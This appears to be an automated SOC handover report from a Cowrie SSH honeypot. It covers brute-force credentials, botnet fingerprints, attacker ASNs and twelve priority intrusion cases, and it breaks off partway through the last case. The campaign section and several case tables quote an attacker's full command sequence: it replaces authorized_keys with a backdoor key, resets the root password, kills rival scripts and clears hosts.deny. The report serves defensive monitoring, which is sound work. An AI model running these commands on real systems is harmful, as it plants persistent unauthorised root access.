# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-18 |
| **Generated At** | 2026-05-18T19:49:23Z |
| **Shift Time** | 19:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **142** |
| Confirmed Threats | **85** |
| False Positives Filtered | **57** (40.1%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **14** |
| High Severity Cases | **24** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **118** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **41** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **9** |
| Unique Passwords | **20** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 10 |
| `test` | 1 |
| `smbuser` | 1 |
| `icon` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 11 |
| `345gs5662d34` | 10 |
| `cyber123` | 2 |
| `ss` | 2 |
| `wib1D2dzy1` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 11 |
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `cyber123` | 2 |
| `root` | `ss` | 2 |
| `root` | `wib1D2dzy1` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `wib1D2dzy1` | `152.136.57.182` | 2026-05-18T17:07:10 |
| `root` | `telnet` | `172.190.216.105` | 2026-05-18T18:51:23 |
| `root` | `3245gs5662d34` | `172.190.216.105` | 2026-05-18T18:51:29 |
| `root` | `powerplay` | `129.226.93.131` | 2026-05-18T18:54:43 |
| `root` | `3245gs5662d34` | `129.226.93.131` | 2026-05-18T18:54:45 |
| `root` | `Qwe123!!` | `49.51.73.108` | 2026-05-18T19:08:58 |
| `root` | `3245gs5662d34` | `49.51.73.108` | 2026-05-18T19:09:04 |
| `root` | `Usman@123` | `43.153.119.154` | 2026-05-18T19:11:27 |
| `root` | `3245gs5662d34` | `43.153.119.154` | 2026-05-18T19:11:33 |
| `root` | `ABCabc123!` | `177.39.20.60` | 2026-05-18T19:14:18 |
| `root` | `3245gs5662d34` | `177.39.20.60` | 2026-05-18T19:14:25 |
| `root` | `cyber123` | `177.39.20.60` | 2026-05-18T19:15:51 |
| `root` | `Abcd!@#$%` | `177.39.20.60` | 2026-05-18T19:21:52 |
| `root` | `123456Qq.` | `177.39.20.60` | 2026-05-18T19:23:20 |
| `root` | `cyber123` | `120.48.60.44` | 2026-05-18T19:24:14 |
| `root` | `ss` | `177.39.20.60` | 2026-05-18T19:24:54 |
| `root` | `Qaz112233` | `120.48.60.44` | 2026-05-18T19:31:24 |
| `root` | `3245gs5662d34` | `120.48.60.44` | 2026-05-18T19:31:35 |
| `root` | `ss` | `120.48.60.44` | 2026-05-18T19:33:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **142** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 58 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 50 | 7 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 50 | 7 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:mVe80io4EESJ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.60.44`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `177.39.20.60`, `49.51.73.108`, `43.153.119.154`, `129.226.93.131`, `172.190.216.105`, `120.48.60.44`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **22** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45899` | VNPT Corp | 1 | LOW |
| `AS8151` | UNINET | 1 | LOW |
| `AS7303` | Telecom Argentina S.A. | 1 | MEDIUM |
| `AS11014` | CPS | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9deb220d2e8f

| Field | Detail |
|---|---|
| **Source IP** | `152.136.57[.]182` |
| **First Seen** | 2026-05-18 17:07 |
| **Last Seen** | 2026-05-18 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 17:07:08` | `cowrie.session.connect` |
| `2026-05-18 17:07:08` | `cowrie.client.version` |
| `2026-05-18 17:07:09` | `cowrie.client.kex` |
| `2026-05-18 17:07:10` | `cowrie.login.success` |
| `2026-05-18 17:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.136.57[.]182` to AbuseIPDB if not already reported
- [ ] Block `152.136.57[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-decb6bdaaa43

| Field | Detail |
|---|---|
| **Source IP** | `172.190.216[.]105` |
| **First Seen** | 2026-05-18 18:51 |
| **Last Seen** | 2026-05-18 18:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 18:51:22` | `cowrie.session.connect` |
| `2026-05-18 18:51:22` | `cowrie.client.version` |
| `2026-05-18 18:51:22` | `cowrie.client.kex` |
| `2026-05-18 18:51:23` | `cowrie.login.success` |
| `2026-05-18 18:51:24` | `cowrie.session.params` |
| `2026-05-18 18:51:24` | `cowrie.command.input` |
| `2026-05-18 18:51:24` | `cowrie.command.failed` |
| `2026-05-18 18:51:24` | `cowrie.log.closed` |
| `2026-05-18 18:51:25` | `cowrie.session.params` |
| `2026-05-18 18:51:25` | `cowrie.command.input` |
| `2026-05-18 18:51:25` | `cowrie.session.file_download` |
| `2026-05-18 18:51:25` | `cowrie.log.closed` |
| `2026-05-18 18:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.216[.]105` to AbuseIPDB if not already reported
- [ ] Block `172.190.216[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d676ab20a620

| Field | Detail |
|---|---|
| **Source IP** | `172.190.216[.]105` |
| **First Seen** | 2026-05-18 18:51 |
| **Last Seen** | 2026-05-18 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 18:51:27` | `cowrie.session.connect` |
| `2026-05-18 18:51:27` | `cowrie.client.version` |
| `2026-05-18 18:51:28` | `cowrie.client.kex` |
| `2026-05-18 18:51:29` | `cowrie.login.success` |
| `2026-05-18 18:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.216[.]105` to AbuseIPDB if not already reported
- [ ] Block `172.190.216[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f074a77641a

| Field | Detail |
|---|---|
| **Source IP** | `129.226.93[.]131` |
| **First Seen** | 2026-05-18 18:54 |
| **Last Seen** | 2026-05-18 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 18:54:43` | `cowrie.session.connect` |
| `2026-05-18 18:54:43` | `cowrie.client.version` |
| `2026-05-18 18:54:43` | `cowrie.client.kex` |
| `2026-05-18 18:54:43` | `cowrie.login.success` |
| `2026-05-18 18:54:43` | `cowrie.session.params` |
| `2026-05-18 18:54:43` | `cowrie.command.input` |
| `2026-05-18 18:54:43` | `cowrie.command.failed` |
| `2026-05-18 18:54:43` | `cowrie.log.closed` |
| `2026-05-18 18:54:43` | `cowrie.session.params` |
| `2026-05-18 18:54:43` | `cowrie.command.input` |
| `2026-05-18 18:54:43` | `cowrie.session.file_download` |
| `2026-05-18 18:54:43` | `cowrie.log.closed` |
| `2026-05-18 18:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.93[.]131` to AbuseIPDB if not already reported
- [ ] Block `129.226.93[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632bf2aa957f

| Field | Detail |
|---|---|
| **Source IP** | `129.226.93[.]131` |
| **First Seen** | 2026-05-18 18:54 |
| **Last Seen** | 2026-05-18 18:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 18:54:45` | `cowrie.session.connect` |
| `2026-05-18 18:54:45` | `cowrie.client.version` |
| `2026-05-18 18:54:45` | `cowrie.client.kex` |
| `2026-05-18 18:54:45` | `cowrie.login.success` |
| `2026-05-18 18:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.93[.]131` to AbuseIPDB if not already reported
- [ ] Block `129.226.93[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa966419f09e

| Field | Detail |
|---|---|
| **Source IP** | `49.51.73[.]108` |
| **First Seen** | 2026-05-18 19:08 |
| **Last Seen** | 2026-05-18 19:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:08:57` | `cowrie.session.connect` |
| `2026-05-18 19:08:57` | `cowrie.client.version` |
| `2026-05-18 19:08:57` | `cowrie.client.kex` |
| `2026-05-18 19:08:58` | `cowrie.login.success` |
| `2026-05-18 19:08:59` | `cowrie.session.params` |
| `2026-05-18 19:08:59` | `cowrie.command.input` |
| `2026-05-18 19:08:59` | `cowrie.command.failed` |
| `2026-05-18 19:08:59` | `cowrie.log.closed` |
| `2026-05-18 19:09:00` | `cowrie.session.params` |
| `2026-05-18 19:09:00` | `cowrie.command.input` |
| `2026-05-18 19:09:00` | `cowrie.session.file_download` |
| `2026-05-18 19:09:00` | `cowrie.log.closed` |
| `2026-05-18 19:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.73[.]108` to AbuseIPDB if not already reported
- [ ] Block `49.51.73[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab42d3e1443

| Field | Detail |
|---|---|
| **Source IP** | `49.51.73[.]108` |
| **First Seen** | 2026-05-18 19:09 |
| **Last Seen** | 2026-05-18 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:09:03` | `cowrie.session.connect` |
| `2026-05-18 19:09:03` | `cowrie.client.version` |
| `2026-05-18 19:09:03` | `cowrie.client.kex` |
| `2026-05-18 19:09:04` | `cowrie.login.success` |
| `2026-05-18 19:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.73[.]108` to AbuseIPDB if not already reported
- [ ] Block `49.51.73[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c3846e9d11d

| Field | Detail |
|---|---|
| **Source IP** | `120.48.60[.]44` |
| **First Seen** | 2026-05-18 19:24 |
| **Last Seen** | 2026-05-18 19:25 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:mVe80io4EESJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:24:13` | `cowrie.session.connect` |
| `2026-05-18 19:24:13` | `cowrie.client.version` |
| `2026-05-18 19:24:13` | `cowrie.client.kex` |
| `2026-05-18 19:24:14` | `cowrie.login.success` |
| `2026-05-18 19:24:15` | `cowrie.session.params` |
| `2026-05-18 19:24:15` | `cowrie.command.input` |
| `2026-05-18 19:24:15` | `cowrie.command.failed` |
| `2026-05-18 19:24:16` | `cowrie.log.closed` |
| `2026-05-18 19:24:17` | `cowrie.session.params` |
| `2026-05-18 19:24:17` | `cowrie.command.input` |
| `2026-05-18 19:24:19` | `cowrie.session.file_download` |
| `2026-05-18 19:24:19` | `cowrie.log.closed` |
| `2026-05-18 19:24:33` | `cowrie.session.params` |
| `2026-05-18 19:24:33` | `cowrie.command.input` |
| `2026-05-18 19:24:33` | `cowrie.log.closed` |
| `2026-05-18 19:24:34` | `cowrie.session.params` |
| `2026-05-18 19:24:34` | `cowrie.command.input` |
| `2026-05-18 19:24:36` | `cowrie.log.closed` |
| `2026-05-18 19:24:36` | `cowrie.session.params` |
| `2026-05-18 19:24:36` | `cowrie.command.input` |
| `2026-05-18 19:24:39` | `cowrie.session.file_download` |
| `2026-05-18 19:24:39` | `cowrie.log.closed` |
| `2026-05-18 19:24:41` | `cowrie.session.params` |
| `2026-05-18 19:24:41` | `cowrie.command.input` |
| `2026-05-18 19:24:42` | `cowrie.log.closed` |
| `2026-05-18 19:24:42` | `cowrie.session.params` |
| `2026-05-18 19:24:42` | `cowrie.command.input` |
| `2026-05-18 19:24:43` | `cowrie.log.closed` |
| `2026-05-18 19:24:46` | `cowrie.session.params` |
| `2026-05-18 19:24:46` | `cowrie.command.input` |
| `2026-05-18 19:24:46` | `cowrie.command.input` |
| `2026-05-18 19:24:47` | `cowrie.log.closed` |
| `2026-05-18 19:24:47` | `cowrie.session.params` |
| `2026-05-18 19:24:47` | `cowrie.command.input` |
| `2026-05-18 19:24:49` | `cowrie.log.closed` |
| `2026-05-18 19:24:49` | `cowrie.session.params` |
| `2026-05-18 19:24:49` | `cowrie.command.input` |
| `2026-05-18 19:24:51` | `cowrie.log.closed` |
| `2026-05-18 19:24:52` | `cowrie.session.params` |
| `2026-05-18 19:24:52` | `cowrie.command.input` |
| `2026-05-18 19:24:53` | `cowrie.log.closed` |
| `2026-05-18 19:24:54` | `cowrie.session.params` |
| `2026-05-18 19:24:54` | `cowrie.command.input` |
| `2026-05-18 19:24:54` | `cowrie.log.closed` |
| `2026-05-18 19:25:01` | `cowrie.session.params` |
| `2026-05-18 19:25:01` | `cowrie.command.input` |
| `2026-05-18 19:25:02` | `cowrie.log.closed` |
| `2026-05-18 19:25:03` | `cowrie.session.params` |
| `2026-05-18 19:25:03` | `cowrie.command.input` |
| `2026-05-18 19:25:03` | `cowrie.log.closed` |
| `2026-05-18 19:25:03` | `cowrie.session.params` |
| `2026-05-18 19:25:03` | `cowrie.command.input` |
| `2026-05-18 19:25:05` | `cowrie.log.closed` |
| `2026-05-18 19:25:05` | `cowrie.session.params` |
| `2026-05-18 19:25:05` | `cowrie.command.input` |
| `2026-05-18 19:25:05` | `cowrie.log.closed` |
| `2026-05-18 19:25:05` | `cowrie.session.params` |
| `2026-05-18 19:25:05` | `cowrie.command.input` |
| `2026-05-18 19:25:07` | `cowrie.log.closed` |
| `2026-05-18 19:25:07` | `cowrie.session.params` |
| `2026-05-18 19:25:07` | `cowrie.command.input` |
| `2026-05-18 19:25:08` | `cowrie.log.closed` |
| `2026-05-18 19:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.60[.]44` to AbuseIPDB if not already reported
- [ ] Block `120.48.60[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a57aa8550df

| Field | Detail |
|---|---|
| **Source IP** | `120.48.60[.]44` |
| **First Seen** | 2026-05-18 19:31 |
| **Last Seen** | 2026-05-18 19:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:31:22` | `cowrie.session.connect` |
| `2026-05-18 19:31:22` | `cowrie.client.version` |
| `2026-05-18 19:31:23` | `cowrie.client.kex` |
| `2026-05-18 19:31:24` | `cowrie.login.success` |
| `2026-05-18 19:31:24` | `cowrie.session.params` |
| `2026-05-18 19:31:24` | `cowrie.command.input` |
| `2026-05-18 19:31:24` | `cowrie.command.failed` |
| `2026-05-18 19:31:25` | `cowrie.log.closed` |
| `2026-05-18 19:31:25` | `cowrie.session.params` |
| `2026-05-18 19:31:25` | `cowrie.command.input` |
| `2026-05-18 19:31:25` | `cowrie.session.file_download` |
| `2026-05-18 19:31:25` | `cowrie.log.closed` |
| `2026-05-18 19:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.60[.]44` to AbuseIPDB if not already reported
- [ ] Block `120.48.60[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea040ad92fa

| Field | Detail |
|---|---|
| **Source IP** | `120.48.60[.]44` |
| **First Seen** | 2026-05-18 19:31 |
| **Last Seen** | 2026-05-18 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 19:31:34` | `cowrie.session.connect` |
| `2026-05-18 19:31:34` | `cowrie.client.version` |
| `2026-05-18 19:31:34` | `cowrie.client.kex` |
| `2026-05-18 19:31:35` | `cowrie.login.success` |
| `2026-05-18 19:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.60[.]44` to AbuseIPDB if not already reported
- [ ] Block `120.48.60[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41dec8c18419

| Field | Detail |
|---|---|
| **Source IP** | `120.48.60[.]44` |
| **First Seen** | 2026-05-18 19:32 |
| **Last Seen** | 2026-05-18 19:33 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
